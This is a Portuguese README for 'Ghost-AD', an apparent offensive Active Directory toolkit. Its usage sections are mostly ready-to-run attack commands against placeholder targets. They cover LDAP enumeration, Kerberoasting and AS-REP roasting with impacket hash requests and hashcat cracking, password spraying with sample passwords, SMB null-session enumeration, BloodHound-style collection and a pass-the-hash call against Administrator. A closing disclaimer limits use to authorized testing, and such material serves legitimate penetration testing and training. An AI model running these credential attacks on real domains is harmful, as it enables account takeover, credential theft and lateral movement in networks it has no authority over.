# Ghost-AD

**Active Directory Offensive Toolkit** - enumeracao LDAP, Kerberoasting, AS-REP Roasting, password spray, BloodHound-lite e hints de PTH/PTT.

```
 ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗      █████╗ ██████╗
██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝     ██╔══██╗██╔══██╗
██║  ███╗███████║██║   ██║███████╗   ██║   ████╗███████║██║  ██║
██║   ██║██╔══██║██║   ██║╚════██║   ██║        ██╔══██║██║  ██║
╚██████╔╝██║  ██║╚██████╔╝███████║   ██║        ██║  ██║██████╔╝
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝        ╚═╝  ╚═╝╚═════╝

  Active Directory Attack Framework  |  v1.0.0
  By Gh0st-Bx1  |  github.com/Ghost-Bx1
```

---

## Modulos

| Subcomando   | Descricao                                              |
|--------------|--------------------------------------------------------|
| `ldap`       | Enumeracao completa via LDAP (usuarios, grupos, SPNs)  |
| `kerb`       | Kerberoasting - lista contas com SPN para crack offline |
| `asrep`      | AS-REP Roasting - contas sem pre-autenticacao Kerberos |
| `spray`      | Password spraying com deteccao de lockout              |
| `smb`        | Enumeracao SMB: null session + shares + signing check  |
| `bloodhound` | Coleta BloodHound-lite - JSON de caminhos de ataque    |
| `pth`        | Hints de Pass-the-Hash / Pass-the-Ticket               |

---

## Instalacao

```bash
git clone https://github.com/Ghost-Bx1/ghost-ad
cd ghost-ad
pip install ldap3
```

> `impacket` e opcional - modulos `spray` e `smb` degradam graciosamente
> e exibem os comandos equivalentes com `crackmapexec` / `smbclient`.

```bash
pip install impacket   # opcional, para spray/smb direto
```

---

## Uso

### Enumeracao LDAP

```bash
# Sessao autenticada
python ghost-ad.py ldap --dc 192.168.1.10 --domain corp.local -u jdoe -p 'P@ssw0rd'

# Sessao anonima (bind anonimo)
python ghost-ad.py ldap --dc 192.168.1.10 --domain corp.local

# Salvar resultados em JSON
python ghost-ad.py ldap --dc 192.168.1.10 --domain corp.local -u jdoe -p 'P@ssw0rd' --output ldap.json
```

### Kerberoasting

```bash
python ghost-ad.py kerb --dc 192.168.1.10 --domain corp.local -u jdoe -p 'P@ssw0rd'
```

Contas com SPN encontradas: use impacket para solicitar TGS e crackear offline:

```bash
impacket-GetUserSPNs corp.local/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10 -request -outputfile kerb.hashes
hashcat -m 13100 kerb.hashes wordlist.txt
```

### AS-REP Roasting

```bash
# Busca anonima no LDAP (sem credenciais)
python ghost-ad.py asrep --dc 192.168.1.10 --domain corp.local

# Com lista de usuarios para verificacao cruzada
python ghost-ad.py asrep --dc 192.168.1.10 --domain corp.local --users-file users.txt
```

Usuarios vulneraveis encontrados: solicitar AS-REP hash via impacket:

```bash
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 192.168.1.10 -format hashcat -outputfile asrep.hashes
hashcat -m 18200 asrep.hashes wordlist.txt
```

### Password Spray

```bash
python ghost-ad.py spray --dc 192.168.1.10 --domain corp.local \
    --users-file users.txt -p 'Winter2025!' --lockout 3 --delay 1.5

# Delay maior para ambientes com GPO de lockout agressiva
python ghost-ad.py spray --dc 192.168.1.10 --domain corp.local \
    --users-file users.txt -p 'Company2025' --lockout 5 --delay 5.0
```

> Sempre verifique o threshold de lockout da politica de senha antes de spray.

### SMB Enumeration

```bash
python ghost-ad.py smb --dc 192.168.1.10

# Com credenciais
python ghost-ad.py smb --dc 192.168.1.10 --domain corp.local -u jdoe -p 'P@ssw0rd'
```

### BloodHound-lite (coleta JSON)

```bash
python ghost-ad.py bloodhound --dc 192.168.1.10 --domain corp.local \
    -u jdoe -p 'P@ssw0rd' --output bh_corp.json
```

O JSON gerado contem: usuarios, grupos, SPNs, contas AS-REP e adminCount.
Importe no BloodHound CE para analise de caminhos de escalada.

### Pass-the-Hash / Pass-the-Ticket (hints)

```bash
python ghost-ad.py pth --dc 192.168.1.10 --domain corp.local \
    -u Administrator --hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

---

## Flags globais

| Flag               | Descricao                              |
|--------------------|----------------------------------------|
| `-v / --verbose`   | Output detalhado                       |
| `--output <file>`  | Salva resultado em JSON                |
| `--no-banner`      | Suprime o banner ao iniciar            |
| `--proxy <url>`    | Proxy HTTP/HTTPS (ex: http://127.0.0.1:8080) |

---

## Flags por modulo

### ldap / kerb / smb / bloodhound

| Flag             | Descricao                                   |
|------------------|---------------------------------------------|
| `--dc <ip>`      | IP ou hostname do Domain Controller (obrig.)|
| `--domain <dom>` | Dominio AD, ex: corp.local (obrig.)         |
| `-u / --user`    | Usuario para autenticacao (opcional)        |
| `-p / --password`| Senha do usuario                            |

### asrep

| Flag              | Descricao                                  |
|-------------------|--------------------------------------------|
| `--dc <ip>`       | IP do Domain Controller                    |
| `--domain <dom>`  | Dominio AD                                 |
| `--users-file`    | Lista de usuarios para verificacao cruzada |

### spray

| Flag              | Descricao                                         |
|-------------------|---------------------------------------------------|
| `--dc <ip>`       | IP do Domain Controller                           |
| `--domain <dom>`  | Dominio AD                                        |
| `--users-file`    | Arquivo com lista de usuarios (um por linha)      |
| `-p / --password` | Senha a testar em todos os usuarios               |
| `--lockout <n>`   | Threshold estimado de lockout (padrao: 3)         |
| `--delay <s>`     | Delay entre tentativas em segundos (padrao: 1.0)  |

### pth

| Flag          | Descricao                          |
|---------------|------------------------------------|
| `--dc <ip>`   | IP do Domain Controller            |
| `--domain`    | Dominio AD                         |
| `-u / --user` | Usuario alvo (padrao: administrator)|
| `--hash`      | Hash NTLM (LM:NT ou apenas :NT)    |

---

## Dependencias

| Biblioteca  | Necessaria para              | Instalacao            |
|-------------|------------------------------|-----------------------|
| `ldap3`     | ldap, kerb, asrep, bloodhound| `pip install ldap3`   |
| `impacket`  | spray (direto), smb          | `pip install impacket`|
| `colorama`  | cores no Windows             | `pip install colorama`|

Sem `ldap3` os modulos LDAP caem para sondagem de porta apenas.
Sem `impacket` spray e smb exibem comandos equivalentes para execucao manual.

---

## Disclaimer

> **Para uso exclusivo em ambientes autorizados.** Testes de penetracao, CTF e
> pesquisa de seguranca ofensiva com permissao explicita do dono do ambiente.
> O autor nao se responsabiliza pelo uso indevido desta ferramenta.

---

**By [Gh0st-Bx1](https://github.com/Ghost-Bx1)**
